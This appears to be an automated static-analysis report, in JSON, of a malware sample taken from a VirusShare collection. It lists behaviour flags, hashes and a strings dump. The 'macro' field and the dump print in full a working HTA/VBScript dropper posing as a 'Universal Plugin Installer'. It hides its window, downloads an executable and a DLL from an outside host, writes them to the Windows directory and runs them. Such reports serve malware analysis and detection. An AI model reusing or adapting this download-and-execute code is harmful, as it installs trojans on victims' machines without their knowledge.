{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "ADODB.Stream": "May create a text file",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Call": "May call a DLL using Excel 4 Macros",
            "Chr": "May attempt to obfuscate specific str",
            "CreateObject": "May create an OLE object",
            "CreateTextFile": "May create a text file",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Microsoft.XMLHTTP": "May download files from the Internet",
            "Open": "May open a file",
            "Run": "May run an executable file or a system command",
            "Shell": "May run an executable file or a system command",
            "Shell.Application": "May run an application",
            "ShellExecute": "May run an executable file or a system command",
            "Write": "May write to a file"
        },
        "macro": "<HTML><HEAD><TITLE>Universal Plugin Installer</TITLE>\n<HTA:APPLICATION id=PlugInst\nAPPLICATIONNAME=\"Plugin Installer\"\nSHOWINTASKBAR=NO\nCAPTION=YES\nSINGLEINSTANCE=YES\nMAXIMIZEBUTTON=NO\nMINIMIZEBUTTON=NO\nWINDOWSTATE=MINIMIZE\n/></HEAD>\n<OBJECT id=\"MSplay\" classid=\"clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B\"></OBJECT>\n<OBJECT id=\"MSmedia\" classid=\"clsid:0D43FE01-F093-11CF-8940-00A0C9054228\"></OBJECT>\n<BODY>\n<SCRIPT language=\"VBScript\">\n\nDim oXMLHTTP\nDim oStream\nDim oShellApp\nDim oFolder\nDim oFolderItem\nDim PluginFile\nDim WinDir\nDim EnvStrings\nDim XMLBody\nDim cByte\nDim ByteCode\nDim FileName\nDim Module_Path\nDim Trojan_Path\n\nssfWINDOWS=36\nWinEnv_Mask=\"windir=\" \n\nExploit_Path=document.location.href\nj=InStrRev(Exploit_Path,\"/\",-1,1)\nExploit_Path=Left(Exploit_Path,j)\n\nIf InStr(Exploit_Path,\"cgi-bin\")<>0 Then\n   CGI_Script_Path=Exploit_Path & \"rcounter.cgi\"    \nElse\n   CGI_Script_Path=Exploit_Path & \"cgi-bin/devil/rcounter.cgi\"    \nEnd If   \n\nInitPaths()\n\nself.MoveTo 6000,6000\n\nFileName=\"\"\nRandomize\nrr=Int(8*Rnd)\nik=0\nDo\n  ii=Int(25*Rnd)+97\n  FileName=FileName+Chr(ii)\n  ik=ik+1\nLoop While ik<rr\nFileName=FileName & \".exe\"\n\nRunCommand=\"\"\nCall Download_and_Execute(Trojan_Path,FileName,RunCommand,0)\n\nFileName=\"\"\nrr=Int(8*Rnd)\nik=0\nDo\n  ii=Int(25*Rnd)+97\n  FileName=FileName+Chr(ii)\n  ik=ik+1\nLoop While ik<rr\nFileName=FileName & \".dll\"\n\nRunCommand=\",\" & \"InstallWMH \" & Trojan_Path & \" \" & CGI_Script_Path\nCall Download_and_Execute(CGI_Script_Path & \"?action=install\",FileName,RunCommand,1)\n\nself.Close\n\nSub Download_and_Execute(Remote_path,Local_name,Run_params,Run_by_Rundll32)\n\nset oXMLHTTP = CreateObject(\"Microsoft.XMLHTTP\")\nModule_Path=Remote_path\nOpenSession()\nGetFile()\n\nOn Error Resume Next\nSet oStream = CreateObject(\"ADODB.Stream\")\nIf Err.number <> 0 Then\n   \n   For Each WinEnv In MSplay.Environment(\"PROCESS\")\n     If InStr(WinEnv,WinEnv_Mask)<>0 Then\n        EnvStrings=Split(WinEnv,\"=\",-1,1)\n        WinDir=EnvStrings(1)   \n     End If\n   Next \n   FileName=WinDir & \"\\\" & Local_name\n   Plugin_size=LenB(XMLBody)\n   \n   Set PluginFile=MSmedia.CreateTextFile(FileName, TRUE)\n\n   For j=1 To Plugin_size \n       cByte=MidB(XMLBody,j,1)\n       ByteCode=AscB(cByte)\n       WriteFile()\n   Next\n\n   PluginFile.Close\n   If Run_by_Rundll32 = 0 Then\n      Cmd=FileName & \" \" & Run_params\n   Else\n      Cmd=\"rundll32\" & \" \" & FileName & Run_params  \n   End If\n   MSplay.Run (Cmd),1,FALSE\nElse\n   Set oShellApp = CreateObject(\"Shell.Application\")\n   Set oFolder=oShellApp.NameSpace(ssfWINDOWS)\n   Set oFolderItem=oFolder.ParseName(\"hh.exe\")\n   WinDir = Left(oFolderItem.Path,InStrRev(oFolderItem.Path,\"\\\"))\n   FileName=WinDir & Local_name\n       \n   Plugin_size=LenB(XMLBody)\n   \n   Set PluginFile=MSmedia.CreateTextFile(FileName, TRUE)\n\n   For j=1 To Plugin_size \n       cByte=MidB(XMLBody,j,1)\n       ByteCode=AscB(cByte)\n       WriteFile()\n   Next\n\n   PluginFile.Close\n\n   If Run_by_Rundll32 = 0 Then\n      Cmd=FileName & \" \" & Run_params\n      oShellApp.ShellExecute Cmd \n   Else\n      Cmd=FileName & Run_params  \n       oShellApp.ShellExecute \"rundll32\", Cmd \n   End If\n    \n   Set oStream=Nothing\n   Set oShellApp=Nothing\nEnd If\nset  oXMLHTTP=Nothing\n\nEnd Sub\n\nFunction WriteFile\nPluginFile.Write(Chr(ByteCode))\nEnd Function\n\nFunction GetFile\noXMLHTTP.Send() \nXMLBody=oXMLHTTP.responseBody\nEnd Function\n\nFunction OpenSession\nReq_type=\"G\" & \"E\" & \"T\"\nHTTPSession=oXMLHTTP.Open(Req_Type,Module_Path,0) \nEnd Function\n\nFunction InitPaths\nTrojan_Path=\"http://www.oil-bank.ru/devil.exe\" \nEnd Function\n\n</SCRIPT>\n</BODY></HTML>\n"
    },
    "filename": "VirusShare_39ecaf020c24f41420e5b0bec640d142",
    "filesize": 3701,
    "filetype": "HTML document, ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "39ecaf020c24f41420e5b0bec640d142",
        "sha1": "3d8210d5d83b7a523c512c9b003cf8648edef7b7",
        "sha256": "78ac3be1639b2f03ef05399c585222f5608b1935a3e6d38857d491860e753058"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "<HTML><HEAD><TITLE>Universal Plugin Installer</TITLE>",
            "<HTA:APPLICATION id=PlugInst",
            "APPLICATIONNAME=\"Plugin Installer\"",
            "SHOWINTASKBAR=NO",
            "CAPTION=YES",
            "SINGLEINSTANCE=YES",
            "MAXIMIZEBUTTON=NO",
            "MINIMIZEBUTTON=NO",
            "WINDOWSTATE=MINIMIZE",
            "/></HEAD>",
            "<OBJECT id=\"MSplay\" classid=\"clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B\"></OBJECT>",
            "<OBJECT id=\"MSmedia\" classid=\"clsid:0D43FE01-F093-11CF-8940-00A0C9054228\"></OBJECT>",
            "<BODY>",
            "<SCRIPT language=\"VBScript\">",
            "Dim oXMLHTTP",
            "Dim oStream",
            "Dim oShellApp",
            "Dim oFolder",
            "Dim oFolderItem",
            "Dim PluginFile",
            "Dim WinDir",
            "Dim EnvStrings",
            "Dim XMLBody",
            "Dim cByte",
            "Dim ByteCode",
            "Dim FileName",
            "Dim Module_Path",
            "Dim Trojan_Path",
            "ssfWINDOWS=36",
            "WinEnv_Mask=\"windir=\" ",
            "Exploit_Path=document.location.href",
            "j=InStrRev(Exploit_Path,\"/\",-1,1)",
            "Exploit_Path=Left(Exploit_Path,j)",
            "If InStr(Exploit_Path,\"cgi-bin\")<>0 Then",
            "   CGI_Script_Path=Exploit_Path & \"rcounter.cgi\"    ",
            "Else",
            "   CGI_Script_Path=Exploit_Path & \"cgi-bin/devil/rcounter.cgi\"    ",
            "End If   ",
            "InitPaths()",
            "self.MoveTo 6000,6000",
            "FileName=\"\"",
            "Randomize",
            "rr=Int(8*Rnd)",
            "ik=0",
            "  ii=Int(25*Rnd)+97",
            "  FileName=FileName+Chr(ii)",
            "  ik=ik+1",
            "Loop While ik<rr",
            "FileName=FileName & \".exe\"",
            "RunCommand=\"\"",
            "Call Download_and_Execute(Trojan_Path,FileName,RunCommand,0)",
            "FileName=\"\"",
            "rr=Int(8*Rnd)",
            "ik=0",
            "  ii=Int(25*Rnd)+97",
            "  FileName=FileName+Chr(ii)",
            "  ik=ik+1",
            "Loop While ik<rr",
            "FileName=FileName & \".dll\"",
            "RunCommand=\",\" & \"InstallWMH \" & Trojan_Path & \" \" & CGI_Script_Path",
            "Call Download_and_Execute(CGI_Script_Path & \"?action=install\",FileName,RunCommand,1)",
            "self.Close",
            "Sub Download_and_Execute(Remote_path,Local_name,Run_params,Run_by_Rundll32)",
            "set oXMLHTTP = CreateObject(\"Microsoft.XMLHTTP\")",
            "Module_Path=Remote_path",
            "OpenSession()",
            "GetFile()",
            "On Error Resume Next",
            "Set oStream = CreateObject(\"ADODB.Stream\")",
            "If Err.number <> 0 Then",
            "   For Each WinEnv In MSplay.Environment(\"PROCESS\")",
            "     If InStr(WinEnv,WinEnv_Mask)<>0 Then",
            "        EnvStrings=Split(WinEnv,\"=\",-1,1)",
            "        WinDir=EnvStrings(1)   ",
            "     End If",
            "   Next ",
            "   FileName=WinDir & \"\\\" & Local_name",
            "   Plugin_size=LenB(XMLBody)",
            "   Set PluginFile=MSmedia.CreateTextFile(FileName, TRUE)",
            "   For j=1 To Plugin_size ",
            "       cByte=MidB(XMLBody,j,1)",
            "       ByteCode=AscB(cByte)",
            "       WriteFile()",
            "   Next",
            "   PluginFile.Close",
            "   If Run_by_Rundll32 = 0 Then",
            "      Cmd=FileName & \" \" & Run_params",
            "   Else",
            "      Cmd=\"rundll32\" & \" \" & FileName & Run_params  ",
            "   End If",
            "   MSplay.Run (Cmd),1,FALSE",
            "Else",
            "   Set oShellApp = CreateObject(\"Shell.Application\")",
            "   Set oFolder=oShellApp.NameSpace(ssfWINDOWS)",
            "   Set oFolderItem=oFolder.ParseName(\"hh.exe\")",
            "   WinDir = Left(oFolderItem.Path,InStrRev(oFolderItem.Path,\"\\\"))",
            "   FileName=WinDir & Local_name",
            "       ",
            "   Plugin_size=LenB(XMLBody)",
            "   Set PluginFile=MSmedia.CreateTextFile(FileName, TRUE)",
            "   For j=1 To Plugin_size ",
            "       cByte=MidB(XMLBody,j,1)",
            "       ByteCode=AscB(cByte)",
            "       WriteFile()",
            "   Next",
            "   PluginFile.Close",
            "   If Run_by_Rundll32 = 0 Then",
            "      Cmd=FileName & \" \" & Run_params",
            "      oShellApp.ShellExecute Cmd ",
            "   Else",
            "      Cmd=FileName & Run_params  ",
            "       oShellApp.ShellExecute \"rundll32\", Cmd ",
            "   End If",
            "    ",
            "   Set oStream=Nothing",
            "   Set oShellApp=Nothing",
            "End If",
            "set  oXMLHTTP=Nothing",
            "End Sub",
            "Function WriteFile",
            "PluginFile.Write(Chr(ByteCode))",
            "End Function",
            "Function GetFile",
            "oXMLHTTP.Send() ",
            "XMLBody=oXMLHTTP.responseBody",
            "End Function",
            "Function OpenSession",
            "Req_type=\"G\" & \"E\" & \"T\"",
            "HTTPSession=oXMLHTTP.Open(Req_Type,Module_Path,0) ",
            "End Function",
            "Function InitPaths",
            "Trojan_Path=\"http://www.oil-bank.ru/devil.exe\" ",
            "End Function",
            "</SCRIPT>",
            "</BODY></HTML>"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://www.oil-bank.ru/devil.exe"
        ]
    },
    "time": "0:00:00.278792",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
